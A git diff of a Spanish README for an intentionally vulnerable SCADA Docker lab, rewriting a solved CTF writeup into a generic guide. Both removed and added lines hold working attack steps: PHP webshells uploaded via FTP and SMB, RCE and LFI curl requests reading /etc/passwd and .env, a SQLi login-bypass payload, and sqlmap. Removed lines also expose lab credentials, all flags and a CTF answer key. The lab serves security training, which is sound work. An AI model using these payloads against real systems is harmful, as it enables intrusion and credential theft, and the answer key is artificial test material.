@@ -1,7 +1,7 @@
 <div align="center">
 
 # ⚡ Planta Energía Vulnerable Lab
-### Writeup Técnico — Intrusión Controlada
+### Guía de Laboratorio — Intrusión Controlada
 
 ![Status](https://img.shields.io/badge/Status-Active-ff3c6e?style=for-the-badge&logo=statuspage&logoColor=white)
 ![Level](https://img.shields.io/badge/Nivel-Intermedio-ffb300?style=for-the-badge&logo=hackthebox&logoColor=white)
@@ -12,7 +12,7 @@
 
 ---
 
-> **Escenario:** Infraestructura SCADA simulada con servicios heredados deliberadamente inseguros. Enfocado en exposición de credenciales, ejecución remota de código y pivote entre superficies **FTP, SMB, Web, SSH, TELNET y SMTP**.
+> **Escenario:** Infraestructura SCADA simulada con servicios heredados deliberadamente inseguros. El objetivo es comprometer el sistema documentando cada vector de ataque sobre las superficies **FTP, SMB, Web, SSH, TELNET y SMTP**.
 
 > [!WARNING]
 > **Aviso Legal:** Uso exclusivo en laboratorio local y red aislada. No exponer este entorno a Internet. Todas las debilidades son intencionales con fines didácticos.
@@ -34,11 +34,8 @@
 | 09 | [🖧 Vector SMB](#-vector-smb) |
 | 10 | [📧 Vector SMTP](#-vector-smtp) |
 | 11 | [🔐 Acceso Remoto — SSH & TELNET](#-acceso-remoto--ssh--telnet) |
-| 12 | [⛓️ Cadenas de Explotación](#️-cadenas-de-explotación) |
-| 13 | [🚩 Tabla de Flags](#-tabla-de-flags) |
-| 14 | [🔍 Hallazgos Técnicos](#-hallazgos-técnicos) |
-| 15 | [⚡ Cheatsheet de Comandos](#-cheatsheet-de-comandos) |
-| 16 | [❓ Preguntas Tipo CTF](#-preguntas-tipo-ctf) |
+| 12 | [🔍 Hallazgos Técnicos](#-hallazgos-técnicos) |
+| 13 | [⚡ Cheatsheet de Comandos](#-cheatsheet-de-comandos) |
 
 ---
 
@@ -61,7 +58,7 @@
 **Levantar el entorno:**
 
 ```bash
-cd /home/f4b55/Contenedores/planta-energia-vulnerable
+cd /ruta/al/contenedor/planta-energia-vulnerable
 docker compose up -d --build
 docker logs -f planta-energia-vulnerable
 ```
@@ -79,14 +76,14 @@ docker compose down
 | Vector | 🔴 Debilidad | 💥 Impacto |
 |--------|-------------|-----------|
 | 🌐 **Web** | `robots.txt`, backups, `.env`, config expuesta | Fuga de credenciales y rutas |
-| 🌐 **Web** | `test/test.php?cmd=` | **RCE** directo |
-| 🌐 **Web** | `test/test.php?file=` | **LFI** — lectura arbitraria |
-| 🌐 **Web** | `/admin/` login form | **SQL Injection** |
+| 🌐 **Web** | Parámetro sin sanitizar en panel debug | **RCE** directo |
+| 🌐 **Web** | Parámetro de inclusión sin validación | **LFI** — lectura arbitraria |
+| 🌐 **Web** | Panel de login con interpolación directa | **SQL Injection** |
 | 📁 **FTP** | Acceso anónimo + upload + sincronización automática | Webshell vía FTP |
-| 🖧 **SMB** | Guest write en share `Public` | Webshell directa |
-| 📧 **SMTP** | `VRFY`, `EXPN`, open relay | Enumeración de cuentas |
-| 🔐 **SSH** | `PermitRootLogin yes` + passwords débiles | Shell remota como root |
-| 📺 **TELNET** | Credenciales en claro | Shell remota legacy |
+| 🖧 **SMB** | Guest write en share accesible | Webshell directa |
+| 📧 **SMTP** | `VRFY`, `EXPN`, open relay habilitados | Enumeración de cuentas |
+| 🔐 **SSH** | `PermitRootLogin yes` + passwords débiles | Shell remota privilegiada |
+| 📺 **TELNET** | Credenciales en texto claro | Shell remota legacy |
 
 ---
 
@@ -96,15 +93,17 @@ docker compose down
 
 ### `[01]` Escaneo de Puertos y Servicios
 
+Identificar puertos abiertos y versiones de servicio:
+
 ```bash
-nmap -sC -sV -Pn -p21,2222,2323,2525,8080,1139,1445 127.0.0.1
+nmap -sC -sV -Pn -p- <TARGET_IP>
 ```
 
 **Hallazgos esperados:**
 
 | Puerto | Servicio | Detalle |
 |--------|----------|---------|
-| `21/tcp` | FTP | `vsftpd 3.0.3`, banner industrial |
+| `21/tcp` | FTP | vsftpd — banner industrial |
 | `2222/tcp` | SSH | Autenticación por password habilitada |
 | `2323/tcp` | TELNET | Acceso en texto claro |
 | `2525/tcp` | SMTP | `VRFY` y `EXPN` habilitados |
@@ -115,9 +114,9 @@ nmap -sC -sV -Pn -p21,2222,2323,2525,8080,1139,1445 127.0.0.1
 ### `[02]` Fingerprint Rápido
 
 ```bash
-curl -i http://127.0.0.1:8080/
-curl -i http://127.0.0.1:8080/robots.txt
-printf 'EHLO test\r\nQUIT\r\n' | nc 127.0.0.1 2525
+curl -i http://<TARGET_IP>:<PORT>/
+curl -i http://<TARGET_IP>:<PORT>/robots.txt
+printf 'EHLO test\r\nQUIT\r\n' | nc <TARGET_IP> <SMTP_PORT>
 ```
 
 ---
@@ -128,82 +127,70 @@ printf 'EHLO test\r\nQUIT\r\n' | nc 127.0.0.1 2525
 
 ### `[01]` Reconocimiento Web — robots.txt
 
+Primer archivo a revisar en cualquier objetivo web:
+
 ```bash
-curl http://127.0.0.1:8080/robots.txt
+curl http://<TARGET_IP>:<PORT>/robots.txt
 ```
 
-**Contenido revelado:**
+> [!TIP]
+> `robots.txt` puede revelar directorios sensibles que el administrador intentó ocultar de los buscadores. Investiga cada ruta listada.
 
-```text
-Disallow: /secret/
-Disallow: /backup/
-Disallow: /test/
-Disallow: /admin/
-```
+**Rutas de interés a explorar:**
 
-**Rutas de interés descubiertas:**
-
-- `/secret/web.txt` — 🚩 Flag
-- `/backup/` — Directory listing con backups
-- `/test/test.php` — Panel de debug vulnerable
-- `/admin/` — Panel SCADA con SQLi
-- `/.env` — Variables de entorno expuestas
-- `/includes/config.php` — Credenciales BD en claro
-- `/phpinfo.php` — Info del servidor
+- Directorios con restricción `Disallow` — pueden contener información sensible
+- Archivos de configuración expuestos (`.env`, `.bak`, `.php`)
+- Paneles de administración o debug
+- Directorios de backup con directory listing activo
 
 ### `[02]` Enumeración de Directorios
 
 ```bash
 # FFUF
-ffuf -u http://127.0.0.1:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt
+ffuf -u http://<TARGET_IP>:<PORT>/FUZZ -w /usr/share/wordlists/dirb/common.txt
 
 # Gobuster
-gobuster dir -u http://127.0.0.1:8080 -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://<TARGET_IP>:<PORT> -w /usr/share/wordlists/dirb/common.txt
 ```
 
 ### `[03]` RCE — Panel de Debug
 
 > [!IMPORTANT]
-> El parámetro `cmd` se pasa directamente a `system()` **sin ninguna validación.**
+> Algunos paneles de debug exponen parámetros GET que pasan directamente a `system()` **sin ninguna validación.** Identifica el endpoint vulnerable y el nombre del parámetro.
 
 ```bash
-# Prueba básica
-curl "http://127.0.0.1:8080/test/test.php?cmd=id"
+# Verificar ejecución de comandos
+curl "http://<TARGET_IP>:<PORT>/<endpoint-vulnerable>?<param>=id"
 
-# Lectura de flag
-curl "http://127.0.0.1:8080/test/test.php?cmd=cat%20/flag_web.txt"
+# Ejemplo de lectura de archivo
+curl "http://<TARGET_IP>:<PORT>/<endpoint-vulnerable>?<param>=cat%20<ruta-objetivo>"
 ```
 
-🚩 **Flag:** `PLE{web_debug_rce_lfi_backup_exp0s3d}`
+🚩 **Objetivo:** encontrar y leer el archivo de flag en el sistema mediante RCE.
 
 ### `[04]` LFI — Local File Inclusion
 
 ```bash
-# Lectura de /etc/passwd
-curl "http://127.0.0.1:8080/test/test.php?file=/etc/passwd"
+# Verificar lectura de archivos del sistema
+curl "http://<TARGET_IP>:<PORT>/<endpoint-vulnerable>?<param>=/etc/passwd"
 
-# Lectura de secretos
-curl "http://127.0.0.1:8080/test/test.php?file=/var/www/html/.env"
+# Leer archivos de configuración internos
+curl "http://<TARGET_IP>:<PORT>/<endpoint-vulnerable>?<param>=/ruta/al/archivo"
 ```
 
 **Impacto:** lectura arbitraria de archivos, recuperación de secretos, apoyo a escalada y pivote.
 
-### `[05]` Flag — Directorio Secreto
+### `[05]` Directorios Ocultos y Archivos Expuestos
 
 ```bash
-curl http://127.0.0.1:8080/secret/web.txt
+# Explorar directorios descubiertos
+curl http://<TARGET_IP>:<PORT>/<directorio-oculto>/
+
+# Leer archivos dentro de directorios con listing activo
+curl http://<TARGET_IP>:<PORT>/<directorio>/
 ```
 
-🚩 **Flag:** `PLE{web_robots_secret_d1r_f0und}`
-
-### `[06]` Flag — Directory Listing y Backups
-
-```bash
-curl http://127.0.0.1:8080/backup/
-curl http://127.0.0.1:8080/backup/web-backup.txt
-```
-
-🚩 **Flag:** `PLE{web_backup_listing_m1sc0nf1g}`
+🚩 **Objetivo:** encontrar flags ocultas en directorios y archivos expuestos por el servidor.
 
 ---
 
@@ -211,29 +198,18 @@ curl http://127.0.0.1:8080/backup/web-backup.txt
 
 ![Risk](https://img.shields.io/badge/Severidad-Crítica-ff3c6e?style=flat-square)
 
-**Archivos accesibles sin autenticación:**
+Múltiples archivos accesibles sin autenticación exponen credenciales del sistema:
 
 ```bash
-curl http://127.0.0.1:8080/.env
-curl http://127.0.0.1:8080/includes/config.php
-curl http://127.0.0.1:8080/backup/config.bak
-curl http://127.0.0.1:8080/backup/usuarios.txt
-```
-
-**Credenciales recuperadas:**
-
-```text
-root         : toor
-admin        : admin123
-operador     : energia123
-scada        : scada
-respaldo     : backup
-ftpuser      : ftp123
-energia_user : Energia2024!
+# Archivos comunes de configuración expuestos
+curl http://<TARGET_IP>:<PORT>/.env
+curl http://<TARGET_IP>:<PORT>/includes/config.php
+curl http://<TARGET_IP>:<PORT>/backup/<archivo>.bak
+curl http://<TARGET_IP>:<PORT>/backup/<archivo>.txt
 ```
 
 > [!IMPORTANT]
-> Estas credenciales habilitan login web, acceso remoto, consultas a la BD y abuso lateral de todos los demás servicios del lab.
+> Las credenciales que encuentres pueden reutilizarse en otros servicios: web, SSH, TELNET, FTP, BD. Documenta todo lo que encuentres y prueba en cada superficie.
 
 ---
 
@@ -241,37 +217,35 @@ energia_user : Energia2024!
 
 ![Tool](https://img.shields.io/badge/Tool-curl%20%7C%20sqlmap-ffb300?style=flat-square)
 
-**Login vulnerable en:** `http://127.0.0.1:8080/admin/`
-
-La consulta backend usa interpolación directa:
+El panel de administración web utiliza interpolación directa de parámetros en la consulta SQL:
 
 ```sql
-SELECT * FROM usuarios WHERE username = '$u' AND password = '$p'
+SELECT * FROM tabla WHERE username = '$u' AND password = '$p'
 ```
 
-### `[01]` Payload Manual
+### `[01]` Payload de Bypass de Autenticación
 
 ```text
-username: admin' OR '1'='1' -- -
-password: x
+username: ' OR '1'='1' -- -
+password: cualquier_valor
 ```
 
 ### `[02]` Explotación con curl
 
 ```bash
-curl -s -X POST http://127.0.0.1:8080/admin/ \
-  -d "username=admin' OR '1'='1' -- -&password=x"
+curl -s -X POST http://<TARGET_IP>:<PORT>/<panel-admin>/ \
+  -d "username=<payload-sqli>&password=x"
 ```
 
 ### `[03]` Automatización con sqlmap
 
 ```bash
-sqlmap -u http://127.0.0.1:8080/admin/ \
+sqlmap -u http://<TARGET_IP>:<PORT>/<panel-admin>/ \
   --data="username=admin&password=test" \
   -p username --batch --level 3 --risk 2
 ```
 
-🚩 **Flag:** `PLE{sqli_auth_bypass_scada_panel}`
+🚩 **Objetivo:** autenticarse en el panel SCADA mediante SQL Injection y obtener la flag.
 
 ---
 
@@ -279,35 +253,41 @@ sqlmap -u http://127.0.0.1:8080/admin/ \
 
 ![Tool](https://img.shields.io/badge/Tool-ftp%20%7C%20curl%20%7C%20lftp-00ff88?style=flat-square)
 
-El servicio FTP permite:
-- ✅ Acceso anónimo
-- ✅ Escritura en `/drop`
-- ✅ Sincronización automática de `*.php` → `/var/www/html/uploads/ftp/drop/`
+El servicio FTP expone las siguientes capacidades:
+- ✅ Acceso anónimo — sin credenciales
+- ✅ Escritura en directorio de subida
+- ✅ Sincronización automática hacia raíz web
 
-### `[01]` Lectura de Flag FTP
+### `[01]` Exploración Anónima
 
 ```bash
-curl ftp://anonymous:any@127.0.0.1/pub/ftp.txt
+# Listar contenido del FTP
+ftp <TARGET_IP>
+# usuario: anonymous / sin password
+
+# Con curl
+curl ftp://anonymous:@<TARGET_IP>/
+curl ftp://anonymous:@<TARGET_IP>/<directorio>/
 ```
 
-🚩 **Flag:** `PLE{ftp_4n0nym0us_wr1t3_exp0s3d}`
+🚩 **Objetivo:** localizar y leer el archivo de flag expuesto en el FTP.
 
 ### `[02]` Webshell vía FTP
 
 ```bash
-# Crear webshell
+# Crear webshell local
 printf '%s\n' '<?php system($_GET["cmd"] ?? "id"); ?>' > shell.php
 
-# Subir al FTP
-curl -T shell.php "ftp://anonymous:any@127.0.0.1/drop/shell.php"
+# Subir al directorio de upload del FTP
+curl -T shell.php "ftp://anonymous:@<TARGET_IP>/<directorio-upload>/shell.php"
 
-# Esperar sincronización y ejecutar
+# Esperar sincronización y ejecutar vía web
 sleep 3
-curl "http://127.0.0.1:8080/uploads/ftp/drop/shell.php?cmd=id"
+curl "http://<TARGET_IP>:<PORT>/<ruta-web-sincronizada>/shell.php?cmd=id"
 ```
 
 > [!NOTE]
-> `ftp_sync.sh` copia cualquier `*.php` desde `/srv/ftp/drop` hacia el árbol web público automáticamente.
+> Investiga si existe un proceso automático que sincronice archivos del FTP hacia el servidor web. Eso convierte el upload en RCE.
 
 ---
 
@@ -318,35 +298,39 @@ curl "http://127.0.0.1:8080/uploads/ftp/drop/shell.php?cmd=id"
 ### `[01]` Listar Shares
 
 ```bash
-smbclient -N -p 1445 -L //127.0.0.1
+smbclient -N -p <PUERTO_SMB> -L //<TARGET_IP>
+enum4linux -a <TARGET_IP>
 ```
 
-**Shares expuestos:**
+**Tipos de shares a investigar:**
 
-| Share | Acceso | Ruta en servidor |
-|-------|--------|-----------------|
-| `Public` | ✅ Guest write | `/var/www/html/uploads/smb` |
-| `Operaciones` | 🔒 Autenticado | — |
-| `Backup` | 👁️ Guest read | Backups del sistema |
+| Acceso | Objetivo |
+|--------|---------|
+| ✅ Guest write | Subida de webshell |
+| 👁️ Guest read | Lectura de backups y credenciales |
+| 🔒 Autenticado | Acceso con credenciales encontradas |
 
 ### `[02]` Webshell vía SMB
 
 ```bash
-# Crear y subir webshell
+# Crear webshell
 printf '%s\n' '<?php system($_GET["cmd"] ?? "id"); ?>' > smb.php
-smbclient -N -p 1445 //127.0.0.1/Public -c "put smb.php smb.php"
 
-# Ejecutar
-curl "http://127.0.0.1:8080/uploads/smb/smb.php?cmd=id"
+# Subir a share con escritura
+smbclient -N -p <PUERTO_SMB> //<TARGET_IP>/<share-con-escritura> -c "put smb.php smb.php"
+
+# Ejecutar vía web si el share apunta al webroot
+curl "http://<TARGET_IP>:<PORT>/<ruta-share-en-web>/smb.php?cmd=id"
 ```
 
-### `[03]` Lectura de Share Backup
+### `[03]` Lectura de Shares con Backups
 
 ```bash
-smbclient -N -p 1445 //127.0.0.1/Backup -c "recurse; ls"
+smbclient -N -p <PUERTO_SMB> //<TARGET_IP>/<share-backup> -c "recurse; ls"
+smbclient -N -p <PUERTO_SMB> //<TARGET_IP>/<share-backup> -c "get <archivo>"
 ```
 
-🚩 **Flag:** `PLE{smb_null_s3ss10n_backup_exp0s3d}`
+🚩 **Objetivo:** encontrar la flag expuesta en los shares SMB y lograr ejecución de código vía webshell.
 
 ---
 
@@ -357,105 +341,72 @@ smbclient -N -p 1445 //127.0.0.1/Backup -c "recurse; ls"
 ### `[01]` Enumeración de Usuarios — VRFY / EXPN
 
 ```bash
-printf 'EHLO auditor.local\r\nVRFY smtpflag\r\nEXPN staff\r\nQUIT\r\n' | nc 127.0.0.1 2525
+# Verificar si VRFY y EXPN están habilitados
+printf 'EHLO auditor.local\r\nVRFY <usuario>\r\nEXPN <alias>\r\nQUIT\r\n' | nc <TARGET_IP> <SMTP_PORT>
 ```
 
-**Usuarios válidos confirmados:** `admin`, `operador`, `scada`, `respaldo`, `ftpuser`, `root`, `smtpflag`
-
-### `[02]` Prueba con swaks
+### `[02]` Enumeración Masiva con smtp-user-enum
 
 ```bash
-swaks --server 127.0.0.1:2525 --ehlo auditor.local --quit-after RCPT
+smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt \
+  -t <TARGET_IP> -p <SMTP_PORT>
+```
+
+### `[03]` Prueba con swaks
+
+```bash
+swaks --server <TARGET_IP>:<SMTP_PORT> --ehlo auditor.local --quit-after RCPT \
+  --to <usuario>@localhost
 ```
 
 **Valor ofensivo:**
-- 📋 Enumeración de usuarios para password spraying
-- 📬 Validación de superficie interna
-- 🔗 Apoyo al movimiento lateral
+- 📋 Enumeración de usuarios válidos del sistema para password spraying
+- 📬 Validación de aliases y grupos internos
+- 🔗 Apoyo al movimiento lateral con credenciales encontradas
 
-🚩 **Flag:** `PLE{smtp_vrfy_open_r3l4y_us3r_enum}`
+🚩 **Objetivo:** enumerar usuarios del sistema vía SMTP y encontrar la flag asociada al servicio.
 
 ---
 
 ## 🔐 Acceso Remoto — SSH & TELNET
 
-### `[01]` SSH — Root por Password Débil
+### `[01]` SSH — Credenciales Débiles
 
 ![Tool](https://img.shields.io/badge/Tool-SSH-5865f2?style=flat-square)
 
 ```bash
-ssh -p 2222 root@127.0.0.1
-# password: toor
+# Intentar acceso con usuarios y contraseñas encontradas
+ssh -p <PUERTO_SSH> <usuario>@<TARGET_IP>
 ```
 
 ```bash
-cat /root/ssh.txt
+# Una vez dentro, buscar flags
+find / -name "*.txt" 2>/dev/null | grep -v proc
 ```
 
-🚩 **Flag:** `PLE{ssh_r00t_l0g1n_w34k_p4ss}`
-
 > [!IMPORTANT]
-> Configuración vulnerable: `PermitRootLogin yes` + `PasswordAuthentication yes`
+> Configuración vulnerable detectada: `PermitRootLogin yes` + `PasswordAuthentication yes`. Usa las credenciales recolectadas en fases anteriores.
 
-### `[02]` TELNET — Credenciales en Texto Claro
+🚩 **Objetivo:** obtener shell remota y encontrar la flag en el sistema de archivos.
+
+### `[02]` TELNET — Protocolo Legacy en Texto Claro
 
 ![Tool](https://img.shields.io/badge/Tool-Telnet-ff3c6e?style=flat-square)
 
 ```bash
-telnet 127.0.0.1 2323
-# usuario: operador
-# password: energia123
+telnet <TARGET_IP> <TELNET_PORT>
+# Usar credenciales encontradas durante la enumeración
 ```
 
 ```bash
-cat /home/operador/telnet.txt
+# Una vez autenticado
+find /home -name "*.txt" 2>/dev/null
 ```
 
-🚩 **Flag:** `PLE{telnet_pl41nt3xt_cr3ds_l34k}`
+> [!WARNING]
+> TELNET transmite todo en **texto claro**, incluyendo credenciales. Capturable con Wireshark o tcpdump en la misma red.
 
----
-
-## ⛓️ Cadenas de Explotación
-
-### 🛣️ Camino 1 — Web Puro
-
-```
-robots.txt  ──►  /backup/ + /.env  ──►  RCE en /test/test.php  ──►  🚩 Flags
-```
-
-### 🛣️ Camino 2 — FTP hacia RCE
-
-```
-FTP anónimo  ──►  upload shell.php en /drop  ──►  sync automático  ──►  🚩 RCE web
-```
-
-### 🛣️ Camino 3 — SMB hacia RCE
-
-```
-Null session  ──►  PUT smb.php en Public  ──►  ejecución en /uploads/smb/  ──►  🚩 RCE
-```
-
-### 🛣️ Camino 4 — Credenciales hacia Shell
-
-```
-backups / .env  ──►  root:toor  ──►  ssh -p 2222 root@127.0.0.1  ──►  🚩 Root shell
-```
-
----
-
-## 🚩 Tabla de Flags
-
-| # | Vector | Ubicación / Técnica | Flag |
-|---|--------|---------------------|------|
-| 1 | 🌐 Web secreto | `/secret/web.txt` | `PLE{web_robots_secret_d1r_f0und}` |
-| 2 | 🌐 Web backup | `/backup/web-backup.txt` | `PLE{web_backup_listing_m1sc0nf1g}` |
-| 3 | 💥 Web RCE | `cat /flag_web.txt` | `PLE{web_debug_rce_lfi_backup_exp0s3d}` |
-| 4 | 💉 SQLi | Panel `/admin/` | `PLE{sqli_auth_bypass_scada_panel}` |
-| 5 | 📁 FTP | `/srv/ftp/pub/ftp.txt` | `PLE{ftp_4n0nym0us_wr1t3_exp0s3d}` |
-| 6 | 🖧 SMB | Share `Backup` | `PLE{smb_null_s3ss10n_backup_exp0s3d}` |
-| 7 | 📧 SMTP | Mailbox `smtpflag` | `PLE{smtp_vrfy_open_r3l4y_us3r_enum}` |
-| 8 | 🔐 SSH | `/root/ssh.txt` | `PLE{ssh_r00t_l0g1n_w34k_p4ss}` |
-| 9 | 📺 TELNET | `/home/operador/telnet.txt` | `PLE{telnet_pl41nt3xt_cr3ds_l34k}` |
+🚩 **Objetivo:** autenticarse por TELNET con credenciales válidas y recuperar la flag.
 
 ---
 
@@ -463,15 +414,15 @@ backups / .env  ──►  root:toor  ──►  ssh -p 2222 root@127.0.0.1  ─
 
 | ID | Hallazgo | Severidad |
 |----|----------|-----------|
-| `PLE-01` | Credenciales expuestas en `/.env`, backups y archivos públicos | ![](https://img.shields.io/badge/-Crítica-ff3c6e?style=flat-square) |
-| `PLE-02` | RCE directa vía `system($_GET['cmd'])` sin validación | ![](https://img.shields.io/badge/-Crítica-ff3c6e?style=flat-square) |
-| `PLE-03` | LFI vía `include($_GET['file'])` | ![](https://img.shields.io/badge/-Crítica-ff3c6e?style=flat-square) |
-| `PLE-04` | SQL Injection en login admin | ![](https://img.shields.io/badge/-Alta-ff6b00?style=flat-square) |
-| `PLE-05` | FTP anónimo con upload y sincronización web | ![](https://img.shields.io/badge/-Alta-ff6b00?style=flat-square) |
-| `PLE-06` | SMB guest write y null session | ![](https://img.shields.io/badge/-Alta-ff6b00?style=flat-square) |
-| `PLE-07` | SSH root por password — `PermitRootLogin yes` | ![](https://img.shields.io/badge/-Alta-ff6b00?style=flat-square) |
-| `PLE-08` | TELNET habilitado — texto claro | ![](https://img.shields.io/badge/-Alta-ff6b00?style=flat-square) |
-| `PLE-09` | SMTP con `VRFY` / `EXPN` — enumeración de usuarios | ![](https://img.shields.io/badge/-Media-ffb300?style=flat-square) |
+| `PLE-01` | Credenciales expuestas en archivos públicos (`.env`, backups, configs) | ![](https://img.shields.io/badge/-Crítica-ff3c6e?style=flat-square) |
+| `PLE-02` | RCE directa vía parámetro GET sin sanitizar — `system()` | ![](https://img.shields.io/badge/-Crítica-ff3c6e?style=flat-square) |
+| `PLE-03` | LFI vía `include()` sin validación de ruta | ![](https://img.shields.io/badge/-Crítica-ff3c6e?style=flat-square) |
+| `PLE-04` | SQL Injection en formulario de login admin | ![](https://img.shields.io/badge/-Alta-ff6b00?style=flat-square) |
+| `PLE-05` | FTP anónimo con upload y sincronización automática al webroot | ![](https://img.shields.io/badge/-Alta-ff6b00?style=flat-square) |
+| `PLE-06` | SMB guest write y null session en shares sensibles | ![](https://img.shields.io/badge/-Alta-ff6b00?style=flat-square) |
+| `PLE-07` | SSH con `PermitRootLogin yes` y contraseñas débiles | ![](https://img.shields.io/badge/-Alta-ff6b00?style=flat-square) |
+| `PLE-08` | TELNET habilitado — protocolo legacy en texto claro | ![](https://img.shields.io/badge/-Alta-ff6b00?style=flat-square) |
+| `PLE-09` | SMTP con `VRFY` / `EXPN` habilitados — enumeración de usuarios | ![](https://img.shields.io/badge/-Media-ffb300?style=flat-square) |
 | `PLE-10` | Banners, versiones y directory listing expuestos | ![](https://img.shields.io/badge/-Media-ffb300?style=flat-square) |
 
 ---
@@ -480,139 +431,48 @@ backups / .env  ──►  root:toor  ──►  ssh -p 2222 root@127.0.0.1  ─
 
 ```bash
 # ── RECON ─────────────────────────────────────────────────────────────
-nmap -sC -sV -Pn -p21,2222,2323,2525,8080,1139,1445 127.0.0.1
+nmap -sC -sV -Pn -p- <TARGET_IP>
+nmap -sC -sV -Pn -p<PORT1>,<PORT2>,<PORT3> <TARGET_IP>
 
 # ── WEB ───────────────────────────────────────────────────────────────
-curl http://127.0.0.1:8080/robots.txt
-curl http://127.0.0.1:8080/.env
-curl "http://127.0.0.1:8080/test/test.php?cmd=id"
-curl "http://127.0.0.1:8080/test/test.php?file=/etc/passwd"
-ffuf -u http://127.0.0.1:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt
+curl http://<TARGET_IP>:<PORT>/robots.txt
+curl http://<TARGET_IP>:<PORT>/<archivo-config>
+curl "http://<TARGET_IP>:<PORT>/<endpoint>?<param>=id"
+curl "http://<TARGET_IP>:<PORT>/<endpoint>?<param>=/etc/passwd"
+ffuf -u http://<TARGET_IP>:<PORT>/FUZZ -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://<TARGET_IP>:<PORT> -w /usr/share/wordlists/dirb/common.txt
 
 # ── SQLi ──────────────────────────────────────────────────────────────
-curl -s -X POST http://127.0.0.1:8080/admin/ \
-  -d "username=admin' OR '1'='1' -- -&password=x"
+curl -s -X POST http://<TARGET_IP>:<PORT>/<panel>/ \
+  -d "username=<payload>&password=x"
+sqlmap -u http://<TARGET_IP>:<PORT>/<panel>/ \
+  --data="username=admin&password=test" -p username --batch
 
 # ── FTP ───────────────────────────────────────────────────────────────
-curl ftp://anonymous:any@127.0.0.1/pub/ftp.txt
-curl -T shell.php "ftp://anonymous:any@127.0.0.1/drop/shell.php"
-curl "http://127.0.0.1:8080/uploads/ftp/drop/shell.php?cmd=id"
+ftp <TARGET_IP>                                      # usuario: anonymous
+curl ftp://anonymous:@<TARGET_IP>/
+curl -T shell.php "ftp://anonymous:@<TARGET_IP>/<upload-dir>/shell.php"
 
 # ── SMB ───────────────────────────────────────────────────────────────
-smbclient -N -p 1445 -L //127.0.0.1
-smbclient -N -p 1445 //127.0.0.1/Public -c "put smb.php smb.php"
-curl "http://127.0.0.1:8080/uploads/smb/smb.php?cmd=id"
+smbclient -N -p <PORT> -L //<TARGET_IP>
+enum4linux -a <TARGET_IP>
+smbclient -N -p <PORT> //<TARGET_IP>/<SHARE> -c "put shell.php shell.php"
+smbclient -N -p <PORT> //<TARGET_IP>/<SHARE> -c "recurse; ls"
 
 # ── SMTP ──────────────────────────────────────────────────────────────
-printf 'EHLO a\r\nVRFY smtpflag\r\nEXPN staff\r\nQUIT\r\n' | nc 127.0.0.1 2525
+printf 'EHLO test\r\nVRFY <usuario>\r\nEXPN <alias>\r\nQUIT\r\n' | nc <TARGET_IP> <PORT>
+smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t <TARGET_IP> -p <PORT>
 
 # ── ACCESO REMOTO ─────────────────────────────────────────────────────
-ssh -p 2222 root@127.0.0.1          # password: toor
-telnet 127.0.0.1 2323               # operador / energia123
+ssh -p <PUERTO_SSH> <usuario>@<TARGET_IP>
+telnet <TARGET_IP> <PUERTO_TELNET>
 ```
-
----
-
-## ❓ Preguntas Tipo CTF
-
-<details>
-<summary>🔭 <strong>Reconocimiento</strong></summary>
-
-| # | Pregunta | Respuesta |
-|---|----------|-----------|
-| 1 | ¿Cuántos puertos TCP expone la máquina al host? | `7` |
-| 2 | ¿Qué puerto externo usa el servicio web? | `8080` |
-| 3 | ¿Qué puerto externo usa SSH? | `2222` |
-| 4 | ¿Qué puerto externo usa TELNET? | `2323` |
-| 5 | ¿Qué puerto externo usa SMTP? | `2525` |
-| 6 | ¿Qué dos puertos corresponden a SMB? | `1139`, `1445` |
-| 7 | ¿Qué software FTP revela el banner? | `vsftpd 3.0.3` |
-| 8 | ¿Cuál es el hostname interno del contenedor? | `ENERGIA-SCADA01` |
-| 9 | ¿Qué archivo web revela rutas sensibles? | `robots.txt` |
-| 10 | ¿Qué directorio oculto en robots.txt contiene una flag? | `/secret/` |
-
-</details>
-
-<details>
-<summary>🌐 <strong>Web</strong></summary>
-
-| # | Pregunta | Respuesta |
-|---|----------|-----------|
-| 11 | ¿Qué archivo expone variables de entorno y credenciales? | `.env` |
-| 12 | ¿Qué archivo PHP contiene credenciales de BD en claro? | `includes/config.php` |
-| 13 | ¿Qué directorio permite directory listing con backups? | `/backup/` |
-| 14 | ¿Qué endpoint ejecuta comandos por parámetro GET? | `/test/test.php?cmd=` |
-| 15 | ¿Qué endpoint permite LFI? | `/test/test.php?file=` |
-| 16 | ¿Qué panel es vulnerable a SQL Injection? | `/admin/` |
-| 17 | ¿Qué técnica permite saltarse el login de `/admin/`? | `SQL Injection` |
-| 18 | ¿Cuál es la base de datos del panel SCADA? | `energia_db` |
-| 19 | ¿Qué usuario de BD aparece en la configuración? | `energia_user` |
-| 20 | ¿Cuál es la contraseña del usuario de BD? | `Energia2024!` |
-
-</details>
-
-<details>
-<summary>📁🖧📧 <strong>FTP / SMB / SMTP</strong></summary>
-
-| # | Pregunta | Respuesta |
-|---|----------|-----------|
-| 21 | ¿Qué protocolo permite acceso anónimo y subida de archivos? | `FTP` |
-| 22 | ¿En qué directorio FTP se suben archivos que terminan expuestos en la web? | `/drop/` |
-| 23 | ¿Qué script sincroniza `*.php` del FTP hacia la ruta web? | `ftp_sync.sh` |
-| 24 | ¿Qué share SMB permite subida anónima? | `Public` |
-| 25 | ¿Qué share SMB expone backups en modo lectura? | `Backup` |
-| 26 | ¿Qué comandos SMTP permiten enumerar usuarios? | `VRFY` y `EXPN` |
-| 27 | ¿Qué cuenta SMTP está asociada a una flag? | `smtpflag` |
-
-</details>
-
-<details>
-<summary>🔐 <strong>Acceso Remoto</strong></summary>
-
-| # | Pregunta | Respuesta |
-|---|----------|-----------|
-| 28 | ¿Qué servicio permite login remoto como `root` con password débil? | `SSH` |
-| 29 | ¿Cuál es la contraseña de `root`? | `toor` |
-| 30 | ¿Qué usuario de TELNET tiene contraseña `energia123`? | `operador` |
-| 31 | ¿Qué servicio legacy transmite credenciales en texto claro? | `TELNET` |
-
-</details>
-
-<details>
-<summary>🚩 <strong>Flags</strong></summary>
-
-| # | Pregunta | Flag |
-|---|----------|------|
-| 32 | Flag del directorio secreto web | `PLE{web_robots_secret_d1r_f0und}` |
-| 33 | Flag del backup web expuesto | `PLE{web_backup_listing_m1sc0nf1g}` |
-| 34 | Flag vía RCE en panel debug | `PLE{web_debug_rce_lfi_backup_exp0s3d}` |
